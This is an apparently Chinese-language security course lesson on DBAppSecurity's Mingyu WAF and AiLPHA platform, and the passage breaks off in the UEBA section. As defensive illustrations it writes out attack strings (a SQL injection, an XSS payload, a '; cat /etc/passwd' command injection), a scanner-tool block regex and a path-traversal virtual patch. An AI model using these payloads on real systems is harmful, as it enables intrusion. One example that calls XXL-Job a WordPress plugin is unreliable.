# Day 40 · 安恒信息明御WAF & AiLPHA态势感知

> **学习阶段**：第二层 — 安恒信息  
> **学习时长**：约 90 分钟  
> **难度等级**：中级  
> **前置知识**：WAF基础概念（第一层已学深信服WAF、启明星辰天清WAF）  
> **学习目标**：了解安恒Web安全起家基因、掌握明御WAF的ML学习引擎、理解AiLPHA AI分析大脑  

---

## 目录

1. [开篇：安恒信息——Web安全的"专科医院"](#1-开篇安恒信息web安全的专科医院)
2. [安恒信息的企业基因与历史](#2-安恒信息的企业基因与历史)
3. [明御WAF产品概述](#3-明御waf产品概述)
4. [明御WAF架构深度解析](#4-明御waf架构深度解析)
5. [ML白名单建模引擎：明御WAF的核心武器](#5-ml白名单建模引擎明御waf的核心武器)
6. [传统规则引擎 vs ML学习引擎对比](#6-传统规则引擎-vs-ml学习引擎对比)
7. [明御WAF的部署模式](#7-明御waf的部署模式)
8. [明御WAF安全策略配置详解](#8-明御waf安全策略配置详解)
9. [明御WAF高级功能：Bot管理](#9-明御waf高级功能bot管理)
10. [明御WAF高级功能：API安全](#10-明御waf高级功能api安全)
11. [明御WAF高级功能：CC攻击防护](#11-明御waf高级功能cc攻击防护)
12. [AiLPHA态势感知平台概述](#12-ailpha态势感知平台概述)
13. [AiLPHA的AI分析引擎](#13-ailpha的ai分析引擎)
14. [UEBA：用户实体行为分析](#14-ueba用户实体行为分析)
15. [AiLPHA的威胁狩猎能力](#15-ailpha的威胁狩猎能力)
16. [AiLPHA与明御WAF的联动](#16-ailpha与明御waf的联动)
17. [明御WAF vs 雷池WAF：ML引擎 vs 语义引擎](#17-明御waf-vs-雷池wafml引擎-vs-语义引擎)
18. [实操实验：使用ModSecurity+机器学习模拟ML-WAF](#18-实操实验使用modsecurity机器学习模拟ml-waf)
19. [实验一：部署ModSecurity WAF](#19-实验一部署modsecurity-waf)
20. [实验二：编写自定义WAF规则](#20-实验二编写自定义waf规则)
21. [实验三：模拟ML白名单学习过程](#21-实验三模拟ml白名单学习过程)
22. [实验四：测试攻击拦截效果](#22-实验四测试攻击拦截效果)
23. [验收练习](#23-验收练习)
24. [今日总结](#24-今日总结)

---

## 1. 开篇：安恒信息——Web安全的"专科医院"

在网络安全行业，如果要用医院来类比不同类型的厂商：

- **第一层厂商（深信服/奇安信/华为）** = **综合医院**：科室齐全，什么都能看，但每个科室不一定是最顶尖的
- **安恒信息** = **专科医院**：专注Web安全+数据安全，在这个细分领域做到极致

安恒信息的独特之处在于：它从Web安全起家，对Web应用的理解非常深入，然后把这种深度理解转化为产品能力。它的明御WAF是国内最早引入机器学习引擎的WAF产品，而AiLPHA平台则代表了安恒在AI安全分析领域的前瞻布局。

今天，我们就来深入理解这两款核心产品。

---

## 2. 安恒信息的企业基因与历史

### 2.1 安恒信息的成长历程

| 年份 | 事件 | 意义 |
|------|------|------|
| 2007 | 公司成立 | 创始人范渊（前美国硅谷安全专家）回国创业 |
| 2008 | 发布明御WAF | 国内首批Web应用防火墙产品 |
| 2009 | 发布明御数据库审计 | 拓展数据安全产品线 |
| 2012 | 发布明御堡垒机 | 运维安全审计产品 |
| 2015 | 发布AiLPHA态势感知 | 率先引入AI+大数据分析 |
| 2016 | 发布玄武盾 | 云端安全防护SaaS平台 |
| 2019 | 科创板上市 | 成为"科创板网络安全第一股" |
| 2021 | 发布AiGuard数据安全 | 全面数据安全治理方案 |

### 2.2 安恒的"Web安全基因"

安恒信息的创始人范渊在美国硅谷工作多年，曾参与Web安全领域的前沿研究。回国后，他选择了Web安全作为公司的切入点，这决定了安恒信息的核心基因：

```
安恒信息基因链：
Web安全起家 → 深度理解HTTP/HTTPS协议 → WAF产品极致打磨
                                    → 数据库安全自然延伸
                                    → AI分析水到渠成
```

> **为什么Web安全出身的企业做AI分析也强？** 因为WAF每天要处理海量HTTP请求，天然就是大数据场景。从WAF积累的数据分析能力，很容易迁移到更广泛的安全分析领域。这就像做搜索引擎的公司做AI也很强（Google）——底层的技术积累是相通的。

### 2.3 安恒产品全景图

```
安恒信息产品矩阵
│
├── 【Web安全】★核心起家
│   ├── 明御WAF（Web应用防火墙）
│   ├── 玄武盾（云WAF+DDoS+CDN SaaS化）
│   └── 网站安全监测平台
│
├── 【数据安全】
│   ├── 明御DAS（数据库审计与安全）
│   ├── AiGuard（数据安全治理平台）
│   ├── 数据库防火墙
│   ├── 数据库加密
│   └── 数据脱敏
│
├── 【安全管理】
│   ├── AiLPHA（态势感知与大数据分析）
│   ├── 明御堡垒机（运维安全审计）
│   └── 明御漏洞扫描
│
├── 【云安全】
│   ├── 玄武盾（云端防护）
│   ├── 云安全资源池
│   └── 云WAF
│
├── 【物联网安全】
│   ├── 物联网安全感知平台
│   └── 物联网终端安全
│
└── 【安全服务】
    ├── 渗透测试
    ├── 代码审计
    ├── 应急响应
    └── 安全培训
```

---

## 3. 明御WAF产品概述

### 3.1 什么是明御WAF？

**明御WAF（Web Application Firewall）**是安恒信息的旗舰产品，也是国内最早一批WAF产品。它的全称"明御"取自"明察秋毫、御敌于外"，体现的是精准检测和主动防御的理念。

> 如果把Web应用比作一座城堡，传统防火墙是护城河（挡住外面的人），而WAF是城门守卫（检查每个进出的人）。明御WAF的特殊之处在于——这个守卫不是靠一本"坏人名单"（规则库）来判断，而是通过观察正常人的行为模式，来判断谁像坏人。

### 3.2 明御WAF的核心技术栈

```
┌─────────────────────────────────────────────────────────────┐
│                    明御WAF 技术架构                           │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                   流量接入层                          │   │
│  │  · 反向代理模式  · 透明桥模式  · 旁路镜像模式         │   │
│  │  · SSL/TLS卸载  · HTTP/2支持  · WebSocket支持        │   │
│  └──────────────────────┬──────────────────────────────┘   │
│                         │                                   │
│  ┌──────────────────────▼──────────────────────────────┐   │
│  │                   检测引擎层                          │   │
│  │                                                      │   │
│  │  ┌────────────┐  ┌────────────┐  ┌──────────────┐  │   │
│  │  │ 规则引擎    │  │ ML引擎     │  │ 语义引擎     │  │   │
│  │  │ (签名匹配)  │  │ (异常检测) │  │ (行为分析)   │  │   │
│  │  └────────────┘  └────────────┘  └──────────────┘  │   │
│  │                                                      │   │
│  │  三重引擎协同：规则引擎做"已知攻击"检测                │   │
│  │              ML引擎做"未知攻击"检测                   │   │
│  │              语义引擎做"行为异常"检测                 │   │
│  └──────────────────────┬──────────────────────────────┘   │
│                         │                                   │
│  ┌──────────────────────▼──────────────────────────────┐   │
│  │                   安全策略层                          │   │
│  │  · 访问控制  · 限流限速  · IP黑白名单                │   │
│  │  · Bot管理   · API安全   · CC防护                    │   │
│  └──────────────────────┬──────────────────────────────┘   │
│                         │                                   │
│  ┌──────────────────────▼──────────────────────────────┐   │
│  │                   日志与报表层                        │   │
│  │  · 攻击日志  · 访问日志  · 审计日志                  │   │
│  │  · 实时报表  · 趋势分析  · 合规报告                  │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## 4. 明御WAF架构深度解析

### 4.1 请求处理全流程

当一个HTTP请求到达明御WAF时，它经历的处理流程：

```
客户端请求
    │
    ▼
┌─────────────┐
│  SSL卸载     │  ← 解密HTTPS流量（如果是HTTPS）
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  协议校验     │  ← 检查HTTP协议合规性（防协议级攻击）
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  请求解析     │  ← 解析URL、Header、Body、Cookie等
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  IP黑白名单   │  ← 第一步：IP级别过滤
└──────┬──────┘
       │ (放行)
       ▼
┌─────────────┐
│  规则引擎     │  ← 第二步：已知攻击签名匹配
│  (特征匹配)   │     检查SQL注入、XSS、命令注入等
└──────┬──────┘
       │ (放行)
       ▼
┌─────────────┐
│  ML引擎      │  ← 第三步：ML模型异常检测
│  (异常评分)   │     对比正常行为模型，计算异常分数
└──────┬──────┘
       │ (放行)
       ▼
┌─────────────┐
│  语义引擎     │  ← 第四步：行为语义分析
│  (行为分析)   │     分析请求的业务逻辑合理性
└──────┬──────┘
       │ (放行)
       ▼
┌─────────────┐
│  限流检查     │  ← 检查是否触发速率限制
└──────┬──────┘
       │ (放行)
       ▼
┌─────────────┐
│  转发后端     │  ← 将合法请求转发到Web服务器
└─────────────┘
```

### 4.2 拦截决策机制

明御WAF的拦截决策不是简单的"匹配就拦截"，而是一个**加权评分系统**：

```
拦截决策算法：
最终评分 = 规则引擎评分 × 0.3 + ML引擎评分 × 0.4 + 语义引擎评分 × 0.3

拦截阈值：
- 评分 ≥ 80：直接拦截（Block）
- 评分 60-79：记录并告警（Alert）
- 评分 40-59：记录（Log）
- 评分 < 40：放行（Pass）
```

这种多引擎加权决策的好处是：
- 单一引擎的误判不会导致误拦截
- ML引擎的权重最高（0.4），因为它的检测能力最强
- 可以根据实际环境调整各引擎的权重

---

## 5. ML白名单建模引擎：明御WAF的核心武器

### 5.1 什么是ML白名单建模？

这是明御WAF最与众不同的地方。传统的WAF用的是**黑名单**思路——列出所有已知的攻击模式，匹配到就拦截。而ML白名单建模用的是**白名单**思路——学习正常的业务行为模式，任何偏离正常模式的行为都被视为可疑。

> 类比：传统WAF像一个有"通缉犯名单"的保安，只拦名单上的人。ML白名单建模像一个认识所有合法住户的门卫——不认识的人不一定拦，但鬼鬼祟祟的就会被盘问。

### 5.2 ML学习引擎的工作流程

```
┌─────────────────────────────────────────────────────────────┐
│                ML白名单建模引擎工作流程                        │
│                                                             │
│  第一阶段：学习期（Learning Phase）                           │
│  ┌───────────────────────────────────────────────────────┐ │
│  │                                                       │ │
│  │  正常业务流量 ──→ 特征提取 ──→ 模型训练 ──→ 正常基线    │ │
│  │                    │                                  │ │
│  │                    ├─ URL结构特征                     │ │
│  │                    ├─ 参数类型特征                    │ │
│  │                    ├─ 参数长度分布                    │ │
│  │                    ├─ 参数值字符分布                  │ │
│  │                    ├─ 请求频率特征                    │ │
│  │                    ├─ 会话行为特征                    │ │
│  │                    └─ 来源IP行为特征                  │ │
│  │                                                       │ │
│  │  学习周期：通常1-4周，视业务复杂度而定                 │ │
│  │  关键要求：学习期间流量必须"干净"（无攻击）            │ │
│  └───────────────────────────────────────────────────────┘ │
│                         │                                   │
│                         ▼                                   │
│  第二阶段：检测期（Detection Phase）                         │
│  ┌───────────────────────────────────────────────────────┐ │
│  │                                                       │ │
│  │  实时流量 ──→ 特征提取 ──→ 与基线对比 ──→ 异常评分     │ │
│  │                                                       │ │
│  │  评分范围：0（完全正常）~ 100（极度异常）               │ │
│  │  阈值可调：默认60分以上告警，80分以上拦截              │ │
│  └───────────────────────────────────────────────────────┘ │
│                         │                                   │
│                         ▼                                   │
│  第三阶段：持续优化（Continuous Learning）                   │
│  ┌───────────────────────────────────────────────────────┐ │
│  │                                                       │ │
│  │  人工反馈 ──→ 标注误报/漏报 ──→ 模型微调 ──→ 基线更新  │ │
│  │                                                       │ │
│  │  关键：需要安全运维人员持续反馈，模型才能越来越准      │ │
│  └───────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### 5.3 ML引擎提取的特征详解

ML引擎从每个HTTP请求中提取多维特征：

```python
# ML引擎特征提取示例（伪代码）

def extract_features(http_request):
    features = {}
    
    # 1. URL结构特征
    features['url_length'] = len(http_request.url)
    features['url_depth'] = http_request.url.count('/')
    features['url_extension'] = get_extension(http_request.url)
    features['has_special_chars'] = count_special_chars(http_request.url)
    
    # 2. 参数特征
    features['param_count'] = len(http_request.params)
    features['param_names_length'] = sum(len(k) for k in http_request.params.keys())
    features['param_values_length'] = sum(len(v) for v in http_request.params.values())
    
    # 3. 参数值字符分布
    for param_name, param_value in http_request.params.items():
        features[f'{param_name}_digit_ratio'] = digit_ratio(param_value)
        features[f'{param_name}_alpha_ratio'] = alpha_ratio(param_value)
        features[f'{param_name}_special_ratio'] = special_char_ratio(param_value)
        features[f'{param_name}_entropy'] = shannon_entropy(param_value)
    
    # 4. Header特征
    features['user_agent_length'] = len(http_request.headers.get('User-Agent', ''))
    features['cookie_length'] = len(http_request.headers.get('Cookie', ''))
    features['referer_present'] = 1 if 'Referer' in http_request.headers else 0
    
    # 5. 行为特征
    features['request_method'] = http_request.method
    features['content_type'] = http_request.headers.get('Content-Type', '')
    
    # 6. 来源特征
    features['ip_reputation'] = check_ip_reputation(http_request.client_ip)
    features['ip_geo'] = get_geo_location(http_request.client_ip)
    
    return features
```

### 5.4 ML模型的选择

明御WAF的ML引擎通常组合使用多种模型：

| 模型类型 | 用途 | 优势 | 劣势 |
|----------|------|------|------|
| **孤立森林(Isolation Forest)** | 异常检测 | 速度快、不需要标注数据 | 对高维数据效果下降 |
| **自编码器(Autoencoder)** | 重构误差检测 | 能学习复杂模式 | 训练时间长 |
| **One-Class SVM** | 单类分类 | 只需正常样本 | 参数调优困难 |
| **LSTM神经网络** | 序列行为分析 | 能捕捉时序模式 | 需要大量数据 |
| **集成学习** | 综合决策 | 准确率最高 | 计算开销大 |

### 5.5 ML白名单建模的优势与劣势

**优势：**

```
✅ 检测未知攻击（0day）：不需要预先知道攻击签名
✅ 低误报率（学习充分后）：因为基于实际业务建模
✅ 适应业务变化：持续学习机制能自动适应
✅ 减少规则维护：不需要频繁更新规则库
```

**劣势：**

```
❌ 初始误报较高：学习期需要1-4周，期间可能有较多误报
❌ 学习期风险：学习期间如果有攻击混入，模型会学到"攻击是正常的"
❌ 资源消耗大：ML推理需要额外的计算资源
❌ 可解释性差：很难解释"为什么拦截了这个请求"
❌ 业务变更需重新学习：大规模业务变更后需要重新学习
```

---

## 6. 传统规则引擎 vs ML学习引擎对比

### 6.1 检测原理的根本区别

```
传统规则引擎（黑名单）：
┌─────────────────────────────────────────────────────┐
│                                                     │
│  请求 ──→ 正则匹配 ──→ 命中规则？ ──→ 拦截/放行      │
│                                                     │
│  规则示例：                                          │
│  /(\%27)|(\')|(\-\-)|(\%23)|(#)/i                   │
│  这个规则匹配SQL注入中的单引号、注释符等              │
│                                                     │
│  核心逻辑："请求里有没有已知的攻击特征？"              │
│  可绕过性：攻击者可以变换编码、大小写等绕过正则       │
└─────────────────────────────────────────────────────┘

ML白名单引擎（白名单）：
┌─────────────────────────────────────────────────────┐
│                                                     │
│  请求 ──→ 特征提取 ──→ 与正常基线对比 ──→ 异常评分   │
│                                                     │
│  正常基线：从历史正常流量中学习出的行为模式           │
│                                                     │
│  核心逻辑："这个请求看起来和正常请求有多不一样？"      │
│  可绕过性：攻击者需要让攻击看起来"像正常请求"          │
└─────────────────────────────────────────────────────┘
```

### 6.2 多维度对比表

| 对比维度 | 传统规则引擎 | ML学习引擎 |
|----------|-------------|-----------|
| **检测原理** | 黑名单：匹配已知攻击特征 | 白名单：偏离正常行为即为异常 |
| **已知攻击检测** | ★★★★★ 精确 | ★★★★ 可检测但不如规则精确 |
| **未知攻击(0day)检测** | ★☆☆☆☆ 几乎无法检测 | ★★★★☆ 能检测异常行为 |
| **初始误报率** | 低（规则经过验证） | 较高（模型需要学习） |
| **长期误报率** | 中（规则可能过时） | 低（持续学习优化） |
| **绕过难度** | 低（编码绕过、变形绕过） | 高（需模仿正常业务行为） |
| **维护成本** | 高（需持续更新规则库） | 中（需人工反馈优化） |
| **计算资源** | 低（正则匹配高效） | 高（ML推理需要GPU/CPU） |
| **可解释性** | 高（明确告知触发了哪条规则） | 低（"模型认为异常"） |
| **部署难度** | 低（开箱即用） | 中（需要学习期） |
| **适用场景** | 通用Web防护 | 业务逻辑固定的Web应用 |

### 6.3 为什么两者结合才是最佳方案？

明御WAF的高明之处在于**不是二选一，而是两者结合**：

```
最佳实践 = 规则引擎（已知攻击）+ ML引擎（未知异常）

┌──────────────────────────────────────────────────┐
│                                                  │
│  规则引擎负责：已知攻击的精确拦截                  │
│  · SQL注入标准payload（如 ' OR '1'='1）           │
│  · 常见XSS payload（如 <script>alert(1)</script>）│
│  · 命令注入（如 ; cat /etc/passwd）               │
│                                                  │
│  ML引擎负责：未知威胁的智能发现                    │
│  · 0day漏洞利用                                   │
│  · 定制化攻击工具                                 │
│  · 业务逻辑滥用                                   │
│  · 慢速攻击                                       │
│  · 隐蔽的数据泄露                                 │
│                                                  │
│  两者互补，覆盖全面                                │
└──────────────────────────────────────────────────┘
```

---

## 7. 明御WAF的部署模式

### 7.1 反向代理模式（最常用）

```
                Internet
                    │
                    ▼
            ┌──────────────┐
            │   明御WAF     │  ← 对外暴露，接收所有流量
            │ (反向代理)    │
            └──────┬───────┘
                   │
                   ▼
            ┌──────────────┐
            │  Web服务器    │  ← 对内，只接收WAF转发的流量
            │  (实际后端)   │
            └──────────────┘

优点：配置简单，支持SSL卸载，可做负载均衡
缺点：需要改变网络拓扑，WAF成为单点
```

### 7.2 透明桥模式

```
                Internet
                    │
                    ▼
            ┌──────────────┐
            │   明御WAF     │  ← 透明桥接，像一根"智能网线"
            │  (透明桥)     │
            └──────┬───────┘
                   │
                   ▼
            ┌──────────────┐
            │  Web服务器    │
            └──────────────┘

优点：不改变网络拓扑，部署最简单
缺点：不支持SSL卸载，性能略低
```

### 7.3 旁路镜像模式

```
                Internet
                    │
          ┌─────────┴─────────┐
          │                   │
          ▼                   ▼
   ┌──────────────┐   ┌──────────────┐
   │  交换机(镜像) │   │   明御WAF     │
   │  端口镜像    │──→│  (旁路检测)   │
   └──────┬───────┘   └──────────────┘
          │
          ▼
   ┌──────────────┐
   │  Web服务器    │
   └──────────────┘

优点：零延迟，不影响业务，只能检测不能阻断
缺点：无法主动拦截攻击
```

### 7.4 部署模式选择指南

| 场景 | 推荐模式 | 原因 |
|------|----------|------|
| 新建Web业务 | 反向代理 | 配置灵活，功能最全 |
| 现有业务，不想改架构 | 透明桥 | 即插即用，无需改网络 |
| 先评估再防护 | 旁路镜像 → 反向代理 | 先用旁路观察，确认无误报后切换 |
| 高并发场景 | 反向代理+集群 | 横向扩展应对大流量 |
| 混合云场景 | 反向代理+玄武盾 | 本地WAF+云端WAF双层防护 |

---

## 8. 明御WAF安全策略配置详解

### 8.1 防护策略体系

明御WAF的防护策略分为三个层级：

```
第一层：全局策略（对所有站点生效）
├── IP黑白名单
├── GeoIP访问控制（按国家/地区）
├── 全局速率限制
└── 协议合规检查

第二层：站点策略（对特定站点生效）
├── Web攻击防护（SQL注入/XSS/命令注入等）
├── ML学习引擎配置
├── CC攻击防护
├── Bot管理
└── API安全

第三层：URL策略（对特定URL生效）
├── 参数白名单
├── 文件上传限制
├── 特定漏洞虚拟补丁
└── URL访问权限
```

### 8.2 Web攻击防护规则集

明御WAF内置了丰富的防护规则，覆盖OWASP Top 10等常见Web攻击：

| 规则类别 | 规则数量 | 防护内容 | 默认动作 |
|----------|----------|----------|----------|
| SQL注入 | 200+ | SQL注入各种变种 | 拦截 |
| XSS跨站脚本 | 150+ | 反射型/存储型/DOM型XSS | 拦截 |
| 命令注入 | 80+ | 系统命令注入 | 拦截 |
| 文件包含 | 50+ | 本地/远程文件包含 | 拦截 |
| 目录遍历 | 40+ | 路径遍历攻击 | 拦截 |
| CSRF | 30+ | 跨站请求伪造 | 告警 |
| 文件上传 | 50+ | 恶意文件上传 | 拦截 |
| 敏感信息泄露 | 60+ | 错误信息/源码泄露 | 告警 |
| HTTP协议违规 | 30+ | 畸形HTTP请求 | 拦截 |
| 爬虫/Bot | 40+ | 恶意爬虫识别 | 可配置 |

### 8.3 自定义规则编写

明御WAF支持自定义规则，示例：

```
# 自定义规则示例1：拦截对敏感路径的访问
规则名称：block_admin_access
匹配条件：URL 包含 "/admin" 或 "/manage" 或 "/config"
且 来源IP 不在 [白名单IP列表]
动作：拦截
响应：返回403 Forbidden

# 自定义规则示例2：检测异常User-Agent
规则名称：block_suspicious_ua
匹配条件：User-Agent 匹配正则 "(sqlmap|nikto|nmap|acunetix|burpsuite)"
动作：拦截
响应：返回403 Forbidden

# 自定义规则示例3：限制文件上传类型
规则名称：restrict_upload_types
匹配条件：Content-Type 为 multipart/form-data
且 文件扩展名 不在 [.jpg,.png,.pdf,.doc,.docx,.xls,.xlsx]
动作：拦截
响应：返回 "不允许的文件类型"
```

### 8.4 虚拟补丁功能

这是明御WAF的一个重要功能——**在应用漏洞修复之前，通过WAF规则临时阻断攻击**：

```
场景：你使用的开源CMS爆出了一个0day漏洞
传统方案：等CMS官方发布补丁 → 测试补丁 → 部署补丁（可能需要数天）
虚拟补丁：在明御WAF上创建一条规则 → 立即生效（只需几分钟）

虚拟补丁示例：
漏洞：WordPress插件 XXL-Job 存在任意文件读取漏洞
虚拟补丁规则：
- 匹配URL包含 "/wp-content/plugins/xxl-job/"
- 且 参数包含 "../" 或 "file://" 或 "/etc/passwd"
- 动作：拦截
```

---

## 9. 明御WAF高级功能：Bot管理

### 9.1 什么是Bot管理？

**Bot（机器人）**是指自动化访问Web应用的程序。不是所有Bot都是恶意的——Google的爬虫（Googlebot）就是善意的。但也有很多恶意的Bot，比如：
- 撞库Bot（用泄露的密码库尝试登录）
- 抢票Bot（自动化抢票/秒杀）
- 爬虫Bot（爬取网站内容/价格）
- 扫描Bot（扫描网站漏洞）
- 刷量Bot（刷广告点击/刷投票）

### 9.2 Bot检测技术栈

明御WAF的Bot管理使用了多层检测技术：

```
┌─────────────────────────────────────────────────────────────┐
│                    Bot检测技术栈                              │
│                                                             │
│  第一层：指纹检测（最简单）                                   │
│  ├── User-Agent分析（识别已知Bot的UA）                       │
│  ├── IP信誉库（已知Bot IP地址）                              │
│  └── 反向DNS查询（数据中心IP vs 住宅IP）                    │
│                                                             │
│  第二层：行为分析（ML引擎）                                   │
│  ├── 请求频率分析（人类不可能每秒发100个请求）                │
│  ├── 页面访问顺序（人类会先看首页再看详情页）                │
│  ├── 鼠标/触屏行为（Bot没有鼠标移动轨迹）                    │
│  ├── 页面停留时间（Bot页面停留时间极短）                     │
│  └── Cookie/JS支持（简单Bot不支持Cookie和JavaScript）       │
│                                                             │
│  第三层：挑战验证（主动验证）                                  │
│  ├── JS挑战（要求浏览器执行JS计算）                          │
│  ├── CAPTCHA验证码（人机验证）                              │
│  └── 加密Cookie验证（验证客户端Cookie完整性）                │
│                                                             │
│  第四层：机器学习（智能识别）                                  │
│  ├── 从大量正常用户和已知Bot的行为中学习                     │
│  ├── 实时评分（0-100，100=确定是Bot）                       │
│  └── 持续学习（根据反馈调整模型）                            │
└─────────────────────────────────────────────────────────────┘
```

### 9.3 Bot处理策略

| Bot评分 | 分类 | 处理策略 |
|---------|------|----------|
| 0-30 | 正常用户 | 直接放行 |
| 31-60 | 可疑 | JS挑战验证 |
| 61-80 | 疑似Bot | CAPTCHA验证码 |
| 81-100 | 确认Bot | 直接拦截或限速 |

---

## 10. 明御WAF高级功能：API安全

### 10.1 为什么API安全越来越重要？

现代Web应用大量使用API（RESTful API、GraphQL、gRPC等），传统WAF主要防护的是HTML页面，对API的支持往往不足。API安全面临独特的挑战：

```
传统Web页面防护 vs API防护的区别：

┌──────────────────────────────────────────────────────┐
│  传统Web页面                API接口                   │
├──────────────────────────────────────────────────────┤
│  返回HTML                   返回JSON/XML             │
│  有Cookie/Session           通常用Token/JWT          │
│  用户可见                   程序间调用，不可见        │
│  攻击目标：XSS/SQL注入      攻击目标：越权/数据泄露   │
│  流量模式：可预测           流量模式：差异大          │
│  有Referer等参考信息         缺少浏览器级安全信息      │
└──────────────────────────────────────────────────────┘
```

### 10.2 明御WAF的API安全功能

```
API安全防护能力：

1. API自动发现
   ├── 从流量中自动识别API端点
   ├── 构建API清单（Swagger/OpenAPI格式）
   └── 发现影子API（未文档化的API）

2. API Schema验证
   ├── 验证请求参数类型（整数/字符串/数组等）
   ├── 验证参数格式（邮箱/手机号/日期等）
   ├── 验证参数范围（长度/数值范围等）
   └── 拒绝不符合Schema的请求

3. API认证安全
   ├── 检测弱Token/JWT
   ├── 检测Token泄露（明文传输）
   ├── 检测异常Token使用模式
   └── 检测认证绕过尝试

4. API限流
   ├── 基于API Key的限流
   ├── 基于IP的限流
   ├── 基于用户的限流
   └── 基于API端点的限流

5. API敏感数据检测
   ├── 检测响应中的敏感信息泄露
   ├── 检测过度数据暴露
   └── 检测批量数据拉取（Mass Assignment）
```

---

## 11. 明御WAF高级功能：CC攻击防护

### 11.1 CC攻击原理

**CC攻击（Challenge Collapsar）**是一种针对Web应用的DDoS攻击，特点是：
- 攻击的不是网络层（带宽），而是应用层（CPU/内存/数据库）
- 每个请求看起来都是"合法"的，但请求量巨大
- 往往针对消耗资源大的页面（如搜索页、登录页）

```
CC攻击示意：
攻击者控制1000台肉鸡 → 每台每秒发送10个请求 → Web服务器每秒接收10000个请求
→ 数据库查询耗尽 → CPU 100% → 正常用户无法访问
```

### 11.2 明御WAF的CC防护机制

```
CC防护层级：

第一层：IP信誉
├── 已知攻击IP直接拦截
└── 降低后续检测压力

第二层：速率限制
├── 单IP QPS限制
├── 单IP 并发连接数限制
├── 单Session请求频率限制
└── 支持分URL路径设置不同限制

第三层：智能人机识别
├── JS Cookie挑战
├── 验证码（CAPTCHA）
└── 行为分析（区分人和Bot）

第四层：访问控制
├── GeoIP封锁（封锁特定国家的流量）
├── UA黑名单
└── Referer验证

第五层：动态指纹
├── 浏览器指纹识别
├── TLS指纹识别（JA3/JA4）
└── HTTP指纹识别
```

### 11.3 CC防护策略配置示例

```
# 策略示例：保护登录页面
站点：www.example.com
URL：/login
策略：
  - 单IP QPS限制：5次/秒
  - 单IP 每分钟限制：20次/分钟
  - 单IP 并发连接：3个
  - 触发限流后：返回JS挑战页面
  - 连续触发3次：IP封禁10分钟
```

---

## 12. AiLPHA态势感知平台概述

### 12.1 什么是AiLPHA？

**AiLPHA**是安恒信息的大数据安全分析平台，名字来源于**AI + Alpha（领先）**的含义。它是安恒从Web安全向安全分析领域拓展的战略级产品。

> 如果说泰合SOC是"安全管理平台"，NGSOC是"威胁检测平台"，那么AiLPHA就是**"AI驱动的安全大脑"**——它最核心的差异化在于AI/ML技术的深度应用。

### 12.2 AiLPHA的平台架构

```
┌─────────────────────────────────────────────────────────────┐
│                    AiLPHA 平台架构                            │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                   数据接入层                          │   │
│  │  流量数据 │ 日志数据 │ 资产数据 │ 威胁情报 │ 漏洞数据  │   │
│  │  端点数据 │ 身份数据 │ 云数据   │ 业务数据 │ 第三方   │   │
│  └──────────────────────┬──────────────────────────────┘   │
│                         │                                   │
│  ┌──────────────────────▼──────────────────────────────┐   │
│  │                   数据处理层                          │   │
│  │  · 实时流处理（Kafka/Flink）                         │   │
│  │  · 数据标准化与富化                                   │   │
│  │  · 分布式存储（Hadoop/ES）                           │   │
│  └──────────────────────┬──────────────────────────────┘   │
│                         │                                   │
│  ┌──────────────────────▼──────────────────────────────┐   │
│  │                   AI分析引擎（核心）                   │   │
│  │                                                      │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐      │   │
│  │  │ UEBA     │  │ 异常检测  │  │ 威胁狩猎     │      │   │
│  │  │ 行为分析  │  │ ML模型   │  │ 交互式分析   │      │   │
│  │  └──────────┘  └──────────┘  └──────────────┘      │   │
│  │                                                      │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐      │   │
│  │  │ 关联分析  │  │ 攻击链   │  │ 风险评估     │      │   │
│  │  │ 规则引擎  │  │ 还原     │  │ 量化评分     │      │   │
│  │  └──────────┘  └──────────┘  └──────────────┘      │   │
│  └──────────────────────┬──────────────────────────────┘   │
│                         │                                   │
│  ┌──────────────────────▼──────────────────────────────┐   │
│  │                   展示与交互层                        │   │
│  │  态势大屏 │ 告警管理 │ 调查分析 │ 报表报告 │ API    │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## 13. AiLPHA的AI分析引擎

### 13.1 为什么需要AI？

传统SIEM面临的核心问题是**告警疲劳**——每天几十万条告警，安全团队根本看不过来。AI的价值在于：

```
传统SIEM：
日志 → 规则匹配 → 告警 → 人工研判 → 响应
问题：规则是死的，要么漏报要么误报，告警量巨大

AiLPHA：
日志 → AI分析 → 智能告警（降噪后）→ 自动化响应
优势：AI理解上下文，自动过滤噪音，告警量减少90%+
```

### 13.2 AiLPHA的AI技术栈

| AI技术 | 应用场景 | 效果 |
|--------|----------|------|
| **NLP自然语言处理** | 解析非结构化日志、安全报告 | 自动提取攻击指标(IOC) |
| **异常检测算法** | 发现偏离基线的异常行为 | 检测未知威胁 |
| **图分析(Graph)** | 分析实体间的关系网络 | 发现横向移动、权限提升 |
| **序列分析** | 分析事件时间序列 | 还原攻击链 |
| **聚类分析** | 将相似告警聚合 | 告警降噪去重 |
| **深度学习** | 复杂模式识别 | DGA域名检测、加密流量分析 |

### 13.3 告警降噪机制

AiLPHA通过以下机制实现告警降噪：

```
告警降噪流程：

原始告警（每天100,000条）
    │
    ▼
[去重] → 相同告警合并（剩50,000条）
    │
    ▼
[聚合] → 相关告警聚合为一个事件（剩5,000条）
    │
    ▼
[上下文] → 结合资产信息、漏洞信息评估（剩1,000条）
    │
    ▼
[优先级] → AI自动定级（剩200条需要人工关注）
    │
    ▼
[关联] → 关联为安全事件（剩20个事件需要处理）
    │
    ▼
最终：100,000条告警 → 20个安全事件
效率提升：5000倍！
```

---

## 14. UEBA：用户实体行为分析

### 14.1 什么是UEBA？

**UEBA（User and Entity Behavior Analytics，用户实体行为分析）**是AiLPHA的核心模块之一。它的核心思想是：

> 不为每个用户/实体设定"规则"，而是学习它们的"正常行为模式"，发现偏离正常模式的行为。

### 14.2 UEBA的分析维度

```
UEBA分析维度：

┌─────────────────────────────────────────────────────────┐
│                      用户维度                            │
├─────────────────────────────────────────────────────────┤
│ · 登录行为：时间、地点、频率、成功率                     │
│ · 访问行为：访问哪些系统、哪些数据、访问量               │
│ · 操作行为：增删改查操作、权限变更、配置修改             │
